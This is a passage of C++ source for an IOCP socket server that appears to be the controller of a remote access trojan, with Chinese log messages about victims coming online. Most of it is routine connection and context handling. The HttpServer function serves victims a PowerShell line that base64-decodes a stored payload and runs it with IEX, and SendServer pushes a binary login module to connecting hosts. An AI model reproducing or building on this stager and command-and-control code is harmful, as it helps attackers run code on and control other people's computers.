			 if (pContext->m_WriteBuffer.GetBufferLen() > 0)
				PostSend(pContext);
			else
				pContext->m_WriteBuffer.ClearBuffer();
		}

	}
	catch (...) {}
	return false;           // issue new read after this one
}

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::CloseCompletionPort
// 
// DESCRIPTION:	Close down the IO Complete Port, queue and associated client context structs
//				which in turn will close the sockets...
//				
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// 
////////////////////////////////////////////////////////////////////////////////
void CIOCPServer::CloseCompletionPort()
{

	while (m_nWorkerCnt)
	{
		PostQueuedCompletionStatus(m_hCompletionPort, 0, (DWORD) NULL, NULL);
		Sleep(100);
	}

	// Close the CompletionPort and stop any more requests
	CloseHandle(m_hCompletionPort);

	ClientContext* pContext = NULL;

	do 
	{
		POSITION pos  = m_listContexts.GetHeadPosition();
		if (pos)
		{
			pContext = m_listContexts.GetNext(pos);			
			RemoveStaleClient(pContext, FALSE);
		}
	}
	while (!m_listContexts.IsEmpty());

	m_listContexts.RemoveAll();

}


BOOL CIOCPServer::AssociateSocketWithCompletionPort(SOCKET socket, HANDLE hCompletionPort, DWORD dwCompletionKey)
{
	HANDLE h = CreateIoCompletionPort((HANDLE) socket, hCompletionPort, dwCompletionKey, 0);
	return h == hCompletionPort;
}

////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::RemoveStaleClient
// 
// DESCRIPTION:	Client has died on us, close socket and remove context from our list
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// 
////////////////////////////////////////////////////////////////////////////////



void CIOCPServer::RemoveStaleClient(ClientContext* pContext, BOOL bGraceful)
{
    CLock cs(m_cs, "RemoveStaleClient");

	TRACE(_T("CIOCPServer::RemoveStaleClient\n"));

    LINGER lingerStruct;


    //
    // If we're supposed to abort the connection, set the linger value
    // on the socket to 0.
    //

    if ( !bGraceful ) 
	{

        lingerStruct.l_onoff = 1;
        lingerStruct.l_linger = 0;
        setsockopt( pContext->m_Socket, SOL_SOCKET, SO_LINGER,
                    (char *)&lingerStruct, sizeof(lingerStruct) );
    }



    //
    // Free context structures
	if (m_listContexts.Find(pContext)) 
	{
	
		//
		// Now close the socket handle.  This will do an abortive or  graceful close, as requested.  
		if(pContext->m_Socket != INVALID_SOCKET)
		{
			CancelIo((HANDLE) pContext->m_Socket);
			closesocket( pContext->m_Socket );
			pContext->m_Socket = INVALID_SOCKET;
		}

        while (!HasOverlappedIoCompleted((LPOVERLAPPED)pContext)) 
                Sleep(0);

	
		//if (pContext->m_Dialog[0])
		//{
		//	UINT	dwThreadId = 0;

		//HANDLE	hWorker = (HANDLE)_beginthreadex(NULL,					// Security
		//		0,						// Stack size - use default
		//	ShakeWindow,     		// Thread fn entry point
		//		(LPVOID)(((CDialog*)pContext->m_Dialog[1])->GetSafeHwnd()),			// Param for thread
		//		0,						// Init flag
		//		&dwThreadId);			// Thread address
		//
		//}
		m_pNotifyProc((LPVOID)m_pFrame, pContext, NC_CLIENT_DISCONNECT);

		MoveToFreePool(pContext);

	}
}


void CIOCPServer::Shutdown()
{
	if (m_bInit == false)
		return;

	m_bInit = false;
	m_bTimeToKill = true;

	// Stop the listener
	Stop();


	closesocket(m_socListen);	
	WSACloseEvent(m_hEvent);


	CloseCompletionPort();
	
	DeleteCriticalSection(&m_cs);

 	while (!m_listFreePool.IsEmpty())
 		delete m_listFreePool.RemoveTail();

}


////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::MoveToFreePool
// 
// DESCRIPTION:	Checks free pool otherwise allocates a context
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// 
////////////////////////////////////////////////////////////////////////////////
void CIOCPServer::MoveToFreePool(ClientContext *pContext)
{
	CLock cs(m_cs, "MoveToFreePool");
    // Free context structures
	POSITION pos = m_listContexts.Find(pContext);
	if (pos) 
	{
		pContext->m_CompressionBuffer.ClearBuffer();
		pContext->m_WriteBuffer.ClearBuffer();
		pContext->m_DeCompressionBuffer.ClearBuffer();
		pContext->m_ResendWriteBuffer.ClearBuffer();
		m_listFreePool.AddTail(pContext);
		m_listContexts.RemoveAt(pos);
	}
}



////////////////////////////////////////////////////////////////////////////////
// 
// FUNCTION:	CIOCPServer::MoveToFreePool
// 
// DESCRIPTION:	Moves an 'used/stale' Context to the free pool for reuse
// 
// INPUTS:		
// 
// NOTES:	
// 
// MODIFICATIONS:
// 
// Name                  Date       Version    Comments
// N T ALMOND            06042001	1.0        Origin
// 
////////////////////////////////////////////////////////////////////////////////
ClientContext*  CIOCPServer::AllocateContext()
{
	ClientContext* pContext = NULL;

	CLock cs(CIOCPServer::m_cs, "AllocateContext");

	if (!m_listFreePool.IsEmpty())
	{
		pContext = m_listFreePool.RemoveHead();
	}
	else
	{
		pContext = new ClientContext;
	}

	ASSERT(pContext);
	
	if (pContext != NULL)
	{

		ZeroMemory(pContext, sizeof(ClientContext));
		pContext->m_bIsMainSocket = false;
		memset(pContext->m_Dialog, 0, sizeof(pContext->m_Dialog));
	}
	return pContext;
}


void CIOCPServer::ResetConnection(ClientContext* pContext)
{

	CString strHost;
	ClientContext* pCompContext = NULL;

	CLock cs(CIOCPServer::m_cs, "ResetConnection");

	POSITION pos  = m_listContexts.GetHeadPosition();
	while (pos)
	{
		pCompContext = m_listContexts.GetNext(pos);			
		if (pCompContext == pContext)
		{
			RemoveStaleClient(pContext, TRUE);
			break;
		}
	}
}

void CIOCPServer::DisconnectAll()
{
	m_bDisconnectAll = true;
	CString strHost;
	ClientContext* pContext = NULL;

	CLock cs(CIOCPServer::m_cs, "DisconnectAll");

	POSITION pos  = m_listContexts.GetHeadPosition();
	while (pos)
	{
		pContext = m_listContexts.GetNext(pos);			
		RemoveStaleClient(pContext, TRUE);
	}
	m_bDisconnectAll = false;

}

bool CIOCPServer::IsRunning()
{
	return m_bInit;
}


//在工作线程中被调用
BOOL CIOCPServer::HandleIO(IOType PacketFlags, ClientContext* ContextObject, DWORD dwTrans)
{


	BOOL bRet = FALSE;

	switch (PacketFlags)
	{
	case IOInitialize:
		bRet = OnClientInitializing(ContextObject, dwTrans);
		break;
	case IORead:
	{
	
		bRet = OnClientReading(ContextObject, dwTrans);
	}


	break;
	case IOWrite:
	{
		
		bRet = OnClientWriting(ContextObject, dwTrans);
	}

	break;
	case IOIdle:
		OutputDebugStringA("=> HandleIO PacketFlags= IOIdle\n");
		break;
	default:
		break;
	}

	return bRet;
}


extern unsigned char* powershellLogin;


BOOL CIOCPServer::HttpServer(ClientContext* pContext)
{
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	CString IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
	CString str = GetHostName(pContext->m_Socket);

	if (powershellLogin == NULL)
	{
		str.Format("控制端未配置命令上线，无法上线");
		g_pCnbclassDlg->ShowLog("上线出错", str, 15);
		closesocket(pContext->m_Socket);
		return TRUE;
	}
	else
	{
		str.Format("IP: %s	     命令上线中", IPAddress.GetBuffer());
		g_pCnbclassDlg->ShowLog("上线准备", str, 15);
	}

	str.Format("HTTP/1.1 200 OK\r\nContent-type: text/plain\r\n\r\n$bhyy=New-Object IO.MemoryStream(,[Convert]::FromBase64String(\"%s\"));IEX (New-Object IO.StreamReader($bhyy)).ReadToEnd();", powershellLogin);
	pContext->m_WriteBuffer.Write((PBYTE)str.GetBuffer(), str.GetLength());
	PostSend(pContext);
	closesocket(pContext->m_Socket);
	return TRUE;
}
BOOL CIOCPServer::SendServer(ClientContext* pContext)
{
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	CString IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";

	CString str = GetHostName(pContext->m_Socket);
	str.Format("IP: %s	     正在下载上线模块", IPAddress);
	g_pCnbclassDlg->ShowLog("上线准备", str, 15);
	pContext->m_WriteBuffer.Write(logincode, sizeof(logincode));
	PostSend(pContext);
	return TRUE;
}